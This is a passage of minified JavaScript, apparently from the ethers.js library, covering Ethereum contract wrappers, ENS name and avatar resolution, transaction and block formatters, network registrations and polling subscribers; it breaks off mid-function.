fragment","UNSUPPORTED_OPERATION",{operation:"fragment",info:{key:e,args:l}}),f},r=async function(...l){const f=n(...l);let h={};if(f.inputs.length+1===l.length&&(h=await que(l.pop()),h.from&&(h.from=await go(h.from,zue(t.runner)))),f.inputs.length!==l.length)throw new Error("internal error: fragment inputs doesn't match arguments; should not happen");const m=await fLe(t.runner,f.inputs,l);return Object.assign({},h,await ho({to:t.getAddress(),data:t.interface.encodeFunctionData(f,m)}))},i=async function(...l){const f=await a(...l);return f.length===1?f[0]:f},s=async function(...l){const f=t.runner;qe(Hue(f),"contract runner does not support sending transactions","UNSUPPORTED_OPERATION",{operation:"sendTransaction"});const h=await f.sendTransaction(await r(...l)),m=Vm(t.runner);return new Rj(t.interface,m,h)},o=async function(...l){const f=Og(t.runner,"estimateGas");return qe($ue(f),"contract runner does not support gas estimation","UNSUPPORTED_OPERATION",{operation:"estimateGas"}),await f.estimateGas(await r(...l))},a=async function(...l){const f=Og(t.runner,"call");qe(Fue(f),"contract runner does not support calling","UNSUPPORTED_OPERATION",{operation:"call"});const h=await r(...l);let m="0x";try{m=await f.call(h)}catch(w){throw fj(w)&&w.data?t.interface.makeError(w.data,h):w}const b=n(...l);return t.interface.decodeFunctionResult(b,m)},c=async(...l)=>n(...l).constant?await i(...l):await s(...l);return Lt(c,{name:t.interface.getFunctionName(e),_contract:t,_key:e,getFragment:n,estimateGas:o,populateTransaction:r,send:s,staticCall:i,staticCallResult:a}),Object.defineProperty(c,"fragment",{configurable:!1,enumerable:!0,get:()=>{const l=t.interface.getFunction(e);return qe(l,"no matching fragment","UNSUPPORTED_OPERATION",{operation:"fragment",info:{key:e}}),l}}),c}function mLe(t,e){const n=function(...i){const s=t.interface.getEvent(e,i);return qe(s,"no matching fragment","UNSUPPORTED_OPERATION",{operation:"fragment",info:{key:e,args:i}}),s},r=function(...i){return new dLe(t,n(...i),i)};return Lt(r,{name:t.interface.getEventName(e),_contract:t,_key:e,getFragment:n}),Object.defineProperty(r,"fragment",{configurable:!1,enumerable:!0,get:()=>{const i=t.interface.getEvent(e);return qe(i,"no matching fragment","UNSUPPORTED_OPERATION",{operation:"fragment",info:{key:e}}),i}}),r}const bI=Symbol.for("_ethersInternal_contract"),Vue=new WeakMap;function gLe(t,e){Vue.set(t[bI],e)}function Ha(t){return Vue.get(t[bI])}function yLe(t){return t&&typeof t=="object"&&"getTopicFilter"in t&&typeof t.getTopicFilter=="function"&&t.fragment}async function Pj(t,e){let n,r=null;if(Array.isArray(e)){const s=function(o){if(gr(o,32))return o;const a=t.interface.getEvent(o);return pe(a,"unknown fragment","name",o),a.topicHash};n=e.map(o=>o==null?null:Array.isArray(o)?o.map(s):s(o))}else e==="*"?n=[null]:typeof e=="string"?gr(e,32)?n=[e]:(r=t.interface.getEvent(e),pe(r,"unknown fragment","event",e),n=[r.topicHash]):yLe(e)?n=await e.getTopicFilter():"fragment"in e?(r=e.fragment,n=[r.topicHash]):pe(!1,"unknown event name","event",e);n=n.map(s=>{if(s==null)return null;if(Array.isArray(s)){const o=Array.from(new Set(s.map(a=>a.toLowerCase())).values());return o.length===1?o[0]:(o.sort(),o)}return s.toLowerCase()});const i=n.map(s=>s==null?"null":Array.isArray(s)?s.join("|"):s).join("&");return{fragment:r,tag:i,topics:n}}async function Q2(t,e){const{subs:n}=Ha(t);return n.get((await Pj(t,e)).tag)||null}async function KG(t,e,n){const r=Vm(t.runner);qe(r,"contract runner does not support subscribing","UNSUPPORTED_OPERATION",{operation:e});const{fragment:i,tag:s,topics:o}=await Pj(t,n),{addr:a,subs:c}=Ha(t);let l=c.get(s);if(!l){const h={address:a||t,topics:o},m=E=>{let A=i;if(A==null)try{A=t.interface.getEvent(E.topics[0])}catch{}if(A){const R=A,S=i?t.interface.decodeEventLog(i,E.data,E.topics):[];ED(t,n,S,v=>new lLe(t,v,n,R,E))}else ED(t,n,[],R=>new Lue(t,R,n,E))};let b=[];l={tag:s,listeners:[],start:()=>{b.length||b.push(r.on(h,m))},stop:async()=>{if(b.length==0)return;let E=b;b=[],await Promise.all(E),r.off(h,m)}},c.set(s,l)}return l}let vD=Promise.resolve();async function bLe(t,e,n,r){await vD;const i=await Q2(t,e);if(!i)return!1;const s=i.listeners.length;return i.listeners=i.listeners.filter(({listener:o,once:a})=>{const c=Array.from(n);r&&c.push(r(a?null:o));try{o.call(t,...c)}catch{}return!a}),i.listeners.length===0&&(i.stop(),Ha(t).subs.delete(i.tag)),s>0}async function ED(t,e,n,r){try{await vD}catch{}const i=bLe(t,e,n,r);return vD=i,await i}const f6=["then"];class mE{target;interface;runner;filters;[bI];fallback;constructor(e,n,r,i){pe(typeof e=="string"||Qce(e),"invalid value for Contract target","target",e),r==null&&(r=null);const s=km.from(n);Lt(this,{target:e,runner:r,interface:s}),Object.defineProperty(this,bI,{value:{}});let o,a=null,c=null;if(i){const h=Vm(r);c=new Rj(this.interface,h,i)}let l=new Map;if(typeof e=="string")if(gr(e))a=e,o=Promise.resolve(e);else{const h=Og(r,"resolveName");if(!N8(h))throw Mr("contract runner does not support name resolution","UNSUPPORTED_OPERATION",{operation:"resolveName"});o=h.resolveName(e).then(m=>{if(m==null)throw Mr("an ENS name used for a contract target must be correctly configured","UNCONFIGURED_NAME",{value:e});return Ha(this).addr=m,m})}else o=e.getAddress().then(h=>{if(h==null)throw new Error("TODO");return Ha(this).addr=h,h});gLe(this,{addrPromise:o,addr:a,deployTx:c,subs:l});const f=new Proxy({},{get:(h,m,b)=>{if(typeof m=="symbol"||f6.indexOf(m)>=0)return Reflect.get(h,m,b);try{return this.getEvent(m)}catch(w){if(!Ss(w,"INVALID_ARGUMENT")||w.argument!=="key")throw w}},has:(h,m)=>f6.indexOf(m)>=0?Reflect.has(h,m):Reflect.has(h,m)||this.interface.hasEvent(String(m))});return Lt(this,{filters:f}),Lt(this,{fallback:s.receive||s.fallback?hLe(this):null}),new Proxy(this,{get:(h,m,b)=>{if(typeof m=="symbol"||m in h||f6.indexOf(m)>=0)return Reflect.get(h,m,b);try{return h.getFunction(m)}catch(w){if(!Ss(w,"INVALID_ARGUMENT")||w.argument!=="key")throw w}},has:(h,m)=>typeof m=="symbol"||m in h||f6.indexOf(m)>=0?Reflect.has(h,m):h.interface.hasFunction(m)})}connect(e){return new mE(this.target,this.interface,e)}attach(e){return new mE(e,this.interface,this.runner)}async getAddress(){return await Ha(this).addrPromise}async getDeployedCode(){const e=Vm(this.runner);qe(e,"runner does not support .provider","UNSUPPORTED_OPERATION",{operation:"getDeployedCode"});const n=await e.getCode(await this.getAddress());return n==="0x"?null:n}async waitForDeployment(){const e=this.deploymentTransaction();if(e)return await e.wait(),this;if(await this.getDeployedCode()!=null)return this;const r=Vm(this.runner);return qe(r!=null,"contract runner does not support .provider","UNSUPPORTED_OPERATION",{operation:"waitForDeployment"}),new Promise((i,s)=>{const o=async()=>{try{if(await this.getDeployedCode()!=null)return i(this);r.once("block",o)}catch(a){s(a)}};o()})}deploymentTransaction(){return Ha(this).deployTx}getFunction(e){return typeof e!="string"&&(e=e.format()),pLe(this,e)}getEvent(e){return typeof e!="string"&&(e=e.format()),mLe(this,e)}async queryTransaction(e){throw new Error("@TODO")}async queryFilter(e,n,r){n==null&&(n=0),r==null&&(r="latest");const{addr:i,addrPromise:s}=Ha(this),o=i||await s,{fragment:a,topics:c}=await Pj(this,e),l={address:o,topics:c,fromBlock:n,toBlock:r},f=Vm(this.runner);return qe(f,"contract runner does not have a provider","UNSUPPORTED_OPERATION",{operation:"queryFilter"}),(await f.getLogs(l)).map(h=>{let m=a;if(m==null)try{m=this.interface.getEvent(h.topics[0])}catch{}if(m)try{return new Ij(h,this.interface,m)}catch(b){return new Uue(h,b)}return new RA(h,f)})}async on(e,n){const r=await KG(this,"on",e);return r.listeners.push({listener:n,once:!1}),r.start(),this}async once(e,n){const r=await KG(this,"once",e);return r.listeners.push({listener:n,once:!0}),r.start(),this}async emit(e,...n){return await ED(this,e,n,null)}async listenerCount(e){if(e){const i=await Q2(this,e);return i?i.listeners.length:0}const{subs:n}=Ha(this);let r=0;for(const{listeners:i}of n.values())r+=i.length;return r}async listeners(e){if(e){const i=await Q2(this,e);return i?i.listeners.map(({listener:s})=>s):[]}const{subs:n}=Ha(this);let r=[];for(const{listeners:i}of n.values())r=r.concat(i.map(({listener:s})=>s));return r}async off(e,n){const r=await Q2(this,e);if(!r)return this;if(n){const i=r.listeners.map(({listener:s})=>s).indexOf(n);i>=0&&r.listeners.splice(i,1)}return(n==null||r.listeners.length===0)&&(r.stop(),Ha(this).subs.delete(r.tag)),this}async removeAllListeners(e){if(e){const n=await Q2(this,e);if(!n)return this;n.stop(),Ha(this).subs.delete(n.tag)}else{const{subs:n}=Ha(this);for(const{tag:r,stop:i}of n.values())i(),n.delete(r)}return this}async addListener(e,n){return await this.on(e,n)}async removeListener(e,n){return await this.off(e,n)}static buildClass(e){class n extends mE{constructor(i,s=null){super(i,e,s)}}return n}static from(e,n,r){return r==null&&(r=null),new this(e,n,r)}}function wLe(){return mE}class vp extends wLe(){}function kO(t){return t.match(/^ipfs:\/\/ipfs\//i)?t=t.substring(12):t.match(/^ipfs:\/\//i)?t=t.substring(7):pe(!1,"unsupported IPFS format","link",t),`https://gateway.ipfs.io/ipfs/${t}`}class vLe{name;constructor(e){Lt(this,{name:e})}connect(e){return this}supportsCoinType(e){return!1}async encodeAddress(e,n){throw new Error("unsupported coin")}async decodeAddress(e,n){throw new Error("unsupported coin")}}const Wue=new RegExp("^(ipfs)://(.*)$","i"),ZG=[new RegExp("^(https)://(.*)$","i"),new RegExp("^(data):(.*)$","i"),Wue,new RegExp("^eip155:[0-9]+/(erc[0-9]+):(.*)$","i")];class l1{provider;address;name;#e;#t;constructor(e,n,r){Lt(this,{provider:e,address:n,name:r}),this.#e=null,this.#t=new vp(n,["function supportsInterface(bytes4) view returns (bool)","function resolve(bytes, bytes) view returns (bytes)","function addr(bytes32) view returns (address)","function addr(bytes32, uint) view returns (bytes)","function text(bytes32, string) view returns (string)","function contenthash(bytes32) view returns (bytes)"],e)}async supportsWildcard(){return this.#e==null&&(this.#e=(async()=>{try{return await this.#t.supportsInterface("0x9061b923")}catch(e){if(Ss(e,"CALL_EXCEPTION"))return!1;throw this.#e=null,e}})()),await this.#e}async#n(e,n){n=(n||[]).slice();const r=this.#t.interface;n.unshift(wD(this.name));let i=null;await this.supportsWildcard()&&(i=r.getFunction(e),qe(i,"missing fragment","UNKNOWN_ERROR",{info:{funcName:e}}),n=[BUe(this.name,255),r.encodeFunctionData(i,n)],e="resolve(bytes,bytes)"),n.push({enableCcipRead:!0});try{const s=await this.#t[e](...n);return i?r.decodeFunctionResult(i,s)[0]:s}catch(s){if(!Ss(s,"CALL_EXCEPTION"))throw s}return null}async getAddress(e){if(e==null&&(e=60),e===60)try{const s=await this.#n("addr(bytes32)");return s==null||s===x_?null:s}catch(s){if(Ss(s,"CALL_EXCEPTION"))return null;throw s}if(e>=0&&e<2147483648){let s=e+2147483648;const o=await this.#n("addr(bytes32,uint)",[s]);if(gr(o,20))return Vn(o)}let n=null;for(const s of this.provider.plugins)if(s instanceof vLe&&s.supportsCoinType(e)){n=s;break}if(n==null)return null;const r=await this.#n("addr(bytes32,uint)",[e]);if(r==null||r==="0x")return null;const i=await n.decodeAddress(e,r);if(i!=null)return i;qe(!1,"invalid coin data","UNSUPPORTED_OPERATION",{operation:`getAddress(${e})`,info:{coinType:e,data:r}})}async getText(e){const n=await this.#n("text(bytes32,string)",[e]);return n==null||n==="0x"?null:n}async getContentHash(){const e=await this.#n("contenthash(bytes32)");if(e==null||e==="0x")return null;const n=e.match(/^0x(e3010170|e5010172)(([0-9a-f][0-9a-f])([0-9a-f][0-9a-f])([0-9a-f]*))$/);if(n){const i=n[1]==="e3010170"?"ipfs":"ipns",s=parseInt(n[4],16);if(n[5].length===s*2)return`${i}://${EBe("0x"+n[2])}`}const r=e.match(/^0xe40101fa011b20([0-9a-f]*)$/);if(r&&r[1].length===64)return`bzz://${r[1]}`;qe(!1,"invalid or unsupported content hash data","UNSUPPORTED_OPERATION",{operation:"getContentHash()",info:{data:e}})}async getAvatar(){return(await this._getAvatar()).url}async _getAvatar(){const e=[{type:"name",value:this.name}];try{const n=await this.getText("avatar");if(n==null)return e.push({type:"!avatar",value:""}),{url:null,linkage:e};e.push({type:"avatar",value:n});for(let r=0;r<ZG.length;r++){const i=n.match(ZG[r]);if(i==null)continue;const s=i[1].toLowerCase();switch(s){case"https":case"data":return e.push({type:"url",value:n}),{linkage:e,url:n};case"ipfs":{const o=kO(n);return e.push({type:"ipfs",value:n}),e.push({type:"url",value:o}),{linkage:e,url:o}}case"erc721":case"erc1155":{const o=s==="erc721"?"tokenURI(uint256)":"uri(uint256)";e.push({type:s,value:n});const a=await this.getAddress();if(a==null)return e.push({type:"!owner",value:""}),{url:null,linkage:e};const c=(i[2]||"").split("/");if(c.length!==2)return e.push({type:`!${s}caip`,value:i[2]||""}),{url:null,linkage:e};const l=c[1],f=new vp(c[0],["function tokenURI(uint) view returns (string)","function ownerOf(uint) view returns (address)","function uri(uint) view returns (string)","function balanceOf(address, uint256) view returns (uint)"],this.provider);if(s==="erc721"){const y=await f.ownerOf(l);if(a!==y)return e.push({type:"!owner",value:y}),{url:null,linkage:e};e.push({type:"owner",value:y})}else if(s==="erc1155"){const y=await f.balanceOf(a,l);if(!y)return e.push({type:"!balance",value:"0"}),{url:null,linkage:e};e.push({type:"balance",value:y.toString()})}let h=await f[o](l);if(h==null||h==="0x")return e.push({type:"!metadata-url",value:""}),{url:null,linkage:e};e.push({type:"metadata-url-base",value:h}),s==="erc1155"&&(h=h.replace("{id}",Lp(l,32).substring(2)),e.push({type:"metadata-url-expanded",value:h})),h.match(/^ipfs:/i)&&(h=kO(h)),e.push({type:"metadata-url",value:h});let m={};const b=await new nd(h).send();b.assertOk();try{m=b.bodyJson}catch{try{e.push({type:"!metadata",value:b.bodyText})}catch{const A=b.body;return A&&e.push({type:"!metadata",value:rt(A)}),{url:null,linkage:e}}return{url:null,linkage:e}}if(!m)return e.push({type:"!metadata",value:""}),{url:null,linkage:e};e.push({type:"metadata",value:JSON.stringify(m)});let w=m.image;if(typeof w!="string")return e.push({type:"!imageUrl",value:""}),{url:null,linkage:e};if(!w.match(/^(https:\/\/|data:)/i)){if(w.match(Wue)==null)return e.push({type:"!imageUrl-ipfs",value:w}),{url:null,linkage:e};e.push({type:"imageUrl-ipfs",value:w}),w=kO(w)}return e.push({type:"url",value:w}),{linkage:e,url:w}}}}}catch{}return{linkage:e,url:null}}static async getEnsAddress(e){const n=await e.getNetwork(),r=n.getPlugin("org.ethers.plugins.network.Ens");return qe(r,"network does not support ENS","UNSUPPORTED_OPERATION",{operation:"getEnsAddress",info:{network:n}}),r.address}static async#r(e,n){const r=await l1.getEnsAddress(e);try{const s=await new vp(r,["function resolver(bytes32) view returns (address)"],e).resolver(wD(n),{enableCcipRead:!0});return s===x_?null:s}catch(i){throw i}return null}static async fromName(e,n){let r=n;for(;;){if(r===""||r==="."||n!=="eth"&&r==="eth")return null;const i=await l1.#r(e,r);if(i!=null){const s=new l1(e,i,n);return r!==n&&!await s.supportsWildcard()?null:s}r=r.split(".").slice(1).join(".")}}}const YG=BigInt(0);function En(t,e){return(function(n){return n==null?e:t(n)})}function k_(t,e){return(n=>{if(e&&n==null)return null;if(!Array.isArray(n))throw new Error("not an array");return n.map(r=>t(r))})}function NA(t,e){return(n=>{const r={};for(const i in t){let s=i;if(e&&i in e&&!(s in n)){for(const o of e[i])if(o in n){s=o;break}}try{const o=t[i](n[s]);o!==void 0&&(r[i]=o)}catch(o){const a=o instanceof Error?o.message:"not-an-error";qe(!1,`invalid value for value.${i} (${a})`,"BAD_DATA",{value:n})}}return r})}function ELe(t){switch(t){case!0:case"true":return!0;case!1:case"false":return!1}pe(!1,`invalid boolean; ${JSON.stringify(t)}`,"value",t)}function G1(t){return pe(gr(t,!0),"invalid data","value",t),t}function Cs(t){return pe(gr(t,32),"invalid hash","value",t),t}const _Le=NA({address:Vn,blockHash:Cs,blockNumber:Qt,data:G1,index:Qt,removed:En(ELe,!1),topics:k_(Cs),transactionHash:Cs,transactionIndex:Qt},{index:["logIndex"]});function ALe(t){return _Le(t)}const CLe=NA({hash:En(Cs),parentHash:Cs,parentBeaconBlockRoot:En(Cs,null),number:Qt,timestamp:Qt,nonce:En(G1),difficulty:wt,gasLimit:wt,gasUsed:wt,stateRoot:En(Cs,null),receiptsRoot:En(Cs,null),blobGasUsed:En(wt,null),excessBlobGas:En(wt,null),miner:En(Vn),prevRandao:En(Cs,null),extraData:G1,baseFeePerGas:En(wt)},{prevRandao:["mixHash"]});function SLe(t){const e=CLe(t);return e.transactions=t.transactions.map(n=>typeof n=="string"?n:Gue(n)),e}const TLe=NA({transactionIndex:Qt,blockNumber:Qt,transactionHash:Cs,address:Vn,topics:k_(Cs),data:G1,index:Qt,blockHash:Cs},{index:["logIndex"]});function xLe(t){return TLe(t)}const ILe=NA({to:En(Vn,null),from:En(Vn,null),contractAddress:En(Vn,null),index:Qt,root:En(rt),gasUsed:wt,blobGasUsed:En(wt,null),logsBloom:En(G1),blockHash:Cs,hash:Cs,logs:k_(xLe),blockNumber:Qt,cumulativeGasUsed:wt,effectiveGasPrice:En(wt),blobGasPrice:En(wt,null),status:En(Qt),type:En(Qt,0)},{effectiveGasPrice:["gasPrice"],hash:["transactionHash"],index:["transactionIndex"]});function RLe(t){return ILe(t)}function Gue(t){t.to&&wt(t.to)===YG&&(t.to="0x0000000000000000000000000000000000000000");const e=NA({hash:Cs,index:En(Qt,void 0),type:n=>n==="0x"||n==null?0:Qt(n),accessList:En(ty,null),blobVersionedHashes:En(k_(Cs,!0),null),authorizationList:En(k_(n=>{let r;if(n.signature)r=n.signature;else{let i=n.yParity;i==="0x1b"?i=0:i==="0x1c"&&(i=1),r=Object.assign({},n,{yParity:i})}return{address:Vn(n.address),chainId:wt(n.chainId),nonce:wt(n.nonce),signature:Lc.from(r)}},!1),null),blockHash:En(Cs,null),blockNumber:En(Qt,null),transactionIndex:En(Qt,null),from:Vn,gasPrice:En(wt),maxPriorityFeePerGas:En(wt),maxFeePerGas:En(wt),maxFeePerBlobGas:En(wt,null),gasLimit:wt,to:En(Vn,null),value:wt,nonce:Qt,data:G1,creates:En(Vn,null),chainId:En(wt,null)},{data:["input"],gasLimit:["gas"],index:["transactionIndex"]})(t);if(e.to==null&&e.creates==null&&(e.creates=gMe(e)),(t.type===1||t.type===2)&&t.accessList==null&&(e.accessList=[]),t.signature?e.signature=Lc.from(t.signature):e.signature=Lc.from(t),e.chainId==null){const n=e.signature.legacyChainId;n!=null&&(e.chainId=n)}return e.blockHash&&wt(e.blockHash)===YG&&(e.blockHash=null),e}const PLe="0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e";class OA{name;constructor(e){Lt(this,{name:e})}clone(){return new OA(this.name)}}class O8 extends OA{effectiveBlock;txBase;txCreate;txDataZero;txDataNonzero;txAccessListStorageKey;txAccessListAddress;constructor(e,n){e==null&&(e=0),super(`org.ethers.network.plugins.GasCost#${e||0}`);const r={effectiveBlock:e};function i(s,o){let a=(n||{})[s];a==null&&(a=o),pe(typeof a=="number",`invalud value for ${s}`,"costs",n),r[s]=a}i("txBase",21e3),i("txCreate",32e3),i("txDataZero",4),i("txDataNonzero",16),i("txAccessListStorageKey",1900),i("txAccessListAddress",2400),Lt(this,r)}clone(){return new O8(this.effectiveBlock,this)}}class k8 extends OA{address;targetNetwork;constructor(e,n){super("org.ethers.plugins.network.Ens"),Lt(this,{address:e||PLe,targetNetwork:n??1})}clone(){return new k8(this.address,this.targetNetwork)}}class NLe extends OA{#e;#t;get url(){return this.#e}get processFunc(){return this.#t}constructor(e,n){super("org.ethers.plugins.network.FetchUrlFeeDataPlugin"),this.#e=e,this.#t=n}clone(){return this}}const DO=new Map;class Ya{#e;#t;#n;constructor(e,n){this.#e=e,this.#t=wt(n),this.#n=new Map}toJSON(){return{name:this.name,chainId:String(this.chainId)}}get name(){return this.#e}set name(e){this.#e=e}get chainId(){return this.#t}set chainId(e){this.#t=wt(e,"chainId")}matches(e){if(e==null)return!1;if(typeof e=="string"){try{return this.chainId===wt(e)}catch{}return this.name===e}if(typeof e=="number"||typeof e=="bigint"){try{return this.chainId===wt(e)}catch{}return!1}if(typeof e=="object"){if(e.chainId!=null){try{return this.chainId===wt(e.chainId)}catch{}return!1}return e.name!=null?this.name===e.name:!1}return!1}get plugins(){return Array.from(this.#n.values())}attachPlugin(e){if(this.#n.get(e.name))throw new Error(`cannot replace existing plugin: ${e.name} `);return this.#n.set(e.name,e.clone()),this}getPlugin(e){return this.#n.get(e)||null}getPlugins(e){return this.plugins.filter(n=>n.name.split("#")[0]===e)}clone(){const e=new Ya(this.name,this.chainId);return this.plugins.forEach(n=>{e.attachPlugin(n.clone())}),e}computeIntrinsicGas(e){const n=this.getPlugin("org.ethers.plugins.network.GasCost")||new O8;let r=n.txBase;if(e.to==null&&(r+=n.txCreate),e.data)for(let i=2;i<e.data.length;i+=2)e.data.substring(i,i+2)==="00"?r+=n.txDataZero:r+=n.txDataNonzero;if(e.accessList){const i=ty(e.accessList);for(const s in i)r+=n.txAccessListAddress+n.txAccessListStorageKey*i[s].storageKeys.length}return r}static from(e){if(OLe(),e==null)return Ya.from("mainnet");if(typeof e=="number"&&(e=BigInt(e)),typeof e=="string"||typeof e=="bigint"){const n=DO.get(e);if(n)return n();if(typeof e=="bigint")return new Ya("unknown",e);pe(!1,"unknown network","network",e)}if(typeof e.clone=="function")return e.clone();if(typeof e=="object"){pe(typeof e.name=="string"&&typeof e.chainId=="number","invalid network object name or chainId","network",e);const n=new Ya(e.name,e.chainId);return(e.ensAddress||e.ensNetwork!=null)&&n.attachPlugin(new k8(e.ensAddress,e.ensNetwork)),n}pe(!1,"invalid network","network",e)}static register(e,n){typeof e=="number"&&(e=BigInt(e));const r=DO.get(e);r&&pe(!1,`conflicting network for ${JSON.stringify(r.name)}`,"nameOrChainId",e),DO.set(e,n)}}function QG(t,e){const n=String(t);if(!n.match(/^[0-9.]+$/))throw new Error(`invalid gwei value: ${t}`);const r=n.split(".");if(r.length===1&&r.push(""),r.length!==2)throw new Error(`invalid gwei value: ${t}`);for(;r[1].length<e;)r[1]+="0";if(r[1].length>9){let i=BigInt(r[1].substring(0,9));r[1].substring(9).match(/^0+$/)||i++,r[1]=i.toString()}return BigInt(r[0]+r[1])}function JG(t){return new NLe(t,async(e,n,r)=>{r.setHeader("User-Agent","ethers");let i;try{const[s,o]=await Promise.all([r.send(),e()]);i=s;const a=i.bodyJson.standard;return{gasPrice:o.gasPrice,maxFeePerGas:QG(a.maxFee,9),maxPriorityFeePerGas:QG(a.maxPriorityFee,9)}}catch(s){qe(!1,`error encountered with polygon gas station (${JSON.stringify(r.url)})`,"SERVER_ERROR",{request:r,response:i,error:s})}})}let XG=!1;function OLe(){if(XG)return;XG=!0;function t(e,n,r){const i=function(){const s=new Ya(e,n);return r.ensNetwork!=null&&s.attachPlugin(new k8(null,r.ensNetwork)),s.attachPlugin(new O8),(r.plugins||[]).forEach(o=>{s.attachPlugin(o)}),s};Ya.register(e,i),Ya.register(n,i),r.altNames&&r.altNames.forEach(s=>{Ya.register(s,i)})}t("mainnet",1,{ensNetwork:1,altNames:["homestead"]}),t("ropsten",3,{ensNetwork:3}),t("rinkeby",4,{ensNetwork:4}),t("goerli",5,{ensNetwork:5}),t("kovan",42,{ensNetwork:42}),t("sepolia",11155111,{ensNetwork:11155111}),t("holesky",17e3,{ensNetwork:17e3}),t("classic",61,{}),t("classicKotti",6,{}),t("arbitrum",42161,{ensNetwork:1}),t("arbitrum-goerli",421613,{}),t("arbitrum-sepolia",421614,{}),t("base",8453,{ensNetwork:1}),t("base-goerli",84531,{}),t("base-sepolia",84532,{}),t("bnb",56,{ensNetwork:1}),t("bnbt",97,{}),t("filecoin",314,{}),t("filecoin-calibration",314159,{}),t("linea",59144,{ensNetwork:1}),t("linea-goerli",59140,{}),t("linea-sepolia",59141,{}),t("matic",137,{ensNetwork:1,plugins:[JG("https://gasstation.polygon.technology/v2")]}),t("matic-amoy",80002,{}),t("matic-mumbai",80001,{altNames:["maticMumbai","maticmum"],plugins:[JG("https://gasstation-testnet.polygon.technology/v2")]}),t("optimism",10,{ensNetwork:1,plugins:[]}),t("optimism-goerli",420,{}),t("optimism-sepolia",11155420,{}),t("xdai",100,{ensNetwork:1})}function _D(t){return JSON.parse(JSON.stringify(t))}class kLe{#e;#t;#n;#r;constructor(e){this.#e=e,this.#t=null,this.#n=4e3,this.#r=-2}get pollingInterval(){return this.#n}set pollingInterval(e){this.#n=e}async#i(){try{const e=await this.#e.getBlockNumber();if(this.#r===-2){this.#r=e;return}if(e!==this.#r){for(let n=this.#r+1;n<=e;n++){if(this.#t==null)return;await this.#e.emit("block",n)}this.#r=e}}catch{}this.#t!=null&&(this.#t=this.#e._setTimeout(this.#i.bind(this),this.#n))}start(){this.#t||(this.#t=this.#e._setTimeout(this.#i.bind(this),this.#n),this.#i())}stop(){this.#t&&(this.#e._clearTimeout(this.#t),this.#t=null)}pause(e){this.stop(),e&&(this.#r=-2)}resume(){this.start()}}class Nj{#e;#t;#n;constructor(e){this.#e=e,this.#n=!1,this.#t=n=>{this._poll(n,this.#e)}}async _poll(e,n){throw new Error("sub-classes must override this")}start(){this.#n||(this.#n=!0,this.#t(-2),this.#e.on("block",this.#t))}stop(){this.#n&&(this.#n=!1,this.#e.off("block",this.#t))}pause(e){this.stop()}resume(){this.start()}}class DLe extends Nj{#e;#t;constructor(e,n){super(e),this.#e=n,this.#t=-2}pause(e){e&&(this.#t=-2),super.pause(e)}async _poll(e,n){const r=await n.getBlock(this.#e);r!=null&&(this.#t===-2?this.#t=r.number:r.number>this.#t&&(n.emit(this.#e,r.number),this.#t=r.number))}}class BLe extends Nj{#e;constructor(e,n){super(e),this.#e=_D(n)}async _poll(e,n){throw new Error("@TODO")}}class jLe extends Nj{#e;constructor(e,n){super(e),this.#e=n}async _poll(e,n){const r=await n.getTransactionReceipt(this.#e);r&&n.emit(this.#e,r)}}class Oj{#e;#t;#n;#r;#i;constructor(e,n){this.#e=e,this.#t=_D(n),this.#n=this.#o.bind(this),this.#r=!1,this.#i=-2}async#o(e){if(this.#i===-2)return;const n=_D(this.#t);n.fromBlock=this.#i+1,n.toBlock=e;const r=await this.#e.getLogs(n);if(r.length===0){this.#i<e-60&&(this.#i=e-60);return}for(const i of r)this.#e.emit(this.#t,i),this.#i=i.blockNumber}start(){this.#r||(this.#r=!0,this.#i===-2&&this.#e.getBlockNumber().then(e=>{this.#i=e}),this.#e.on("block",this.#n))}stop(){this.#r&&(this.#r=!1,this.#e.off("block",this.#n))}pause(e){this.stop(),e&&(this.#i=-2)}resume(){this.start()}}const MLe=BigInt(2),ULe=10;function h6(t){return t&&typeof t.then=="function"}function JT(t,e){return t+":"+JSON.stringify(e,(n,r)=>{if(r==null)return"null";if(typeof r=="bigint")return`bigint:${r.toString()}`;if(typeof r=="string")return r.toLowerCase();if(typeof r=="object"&&!Array.isArray(r)){const i=Object.keys(r);return i.sort(),i.reduce((s,o)=>(s[o]=r[o],s),{})}return r})}class Kue{name;constructor(e){Lt(this,{name:e})}start(){}stop(){}pause(e){}resume(){}}function LLe(t){return JSON.parse(JSON.stringify(t))}function AD(t){return t=Array.from(new Set(t).values()),t.sort(),t}async function BO(t,e){if(t==null)throw new Error("invalid event");if(Array.isArray(t)&&(t={topics:t}),typeof t=="string")switch(t){case"block":case"debug":case"error":case"finalized":case"network":case"pending":case"safe":return{type:t,tag:t}}if(gr(t,32)){const n=t.toLowerCase();return{type:"transaction",tag:JT("tx",{hash:n}),hash:n}}if(t.orphan){const n=t;return{type:"orphan",tag:JT("orphan",n),filter:LLe(n)}}if(t.address||t.topics){const n=t,r={topics:(n.topics||[]).map(i=>i==null?null:Array.isArray(i)?AD(i.map(s=>s.toLowerCase())):i.toLowerCase())};if(n.address){const i=[],s=[],o=a=>{gr(a)?i.push(a):s.push((async()=>{i.push(await go(a,e))})())};Array.isArray(n.address)?n.address.forEach(o):o(n.address),s.length&&await Promise.all(s),r.address=AD(i.map(a=>a.toLowerCase()))}return{filter:r,tag:JT("event",r),type:"event"}}pe(!1,"unknown ProviderEvent","event",t)}function jO(){return new Date().getTime()}const FLe={cacheTimeout:250,pollingInterval:4e3};class $Le{#e;#t;#n;#r;#i;#o;#s;#a;#d;#u;#p;#m;constructor(e,n){if(this.#m=Object.assign({},FLe,n||{}),e==="any")this.#o=!0,this.#i=null;else if(e){const r=Ya.from(e);this.#o=!1,this.#i=Promise.resolve(r),setTimeout(()=>{this.emit("network",r,null)},0)}else this.#o=!1,this.#i=null;this.#a=-1,this.#s=new Map,this.#e=new Map,this.#t=new Map,this.#n=null,this.#r=!1,this.#d=1,this.#u=new Map,this.#p=!1}get pollingInterval(){return this.#m.pollingInterval}get provider(){return this}get plugins(){return Array.from(this.#t.values())}attachPlugin(e){if(this.#t.get(e.name))throw new Error(`cannot replace existing plugin: ${e.name} `);return this.#t.set(e.name,e.connect(this)),this}getPlugin(e){return this.#t.get(e)||null}get disableCcipRead(){return this.#p}set disableCcipRead(e){this.#p=!!e}async#c(e){const n=this.#m.cacheTimeout;if(n<0)return await this._perform(e);const r=JT(e.method,e);let i=this.#s.get(r);return i||(i=this._perform(e),this.#s.set(r,i),setTimeout(()=>{this.#s.get(r)===i&&this.#s.delete(r)},n)),await i}async ccipReadFetch(e,n,r){if(this.disableCcipRead||r.length===0||e.to==null)return null;const i=e.to.toLowerCase(),s=n.toLowerCase(),o=[];for(let a=0;a<r.length;a++){const 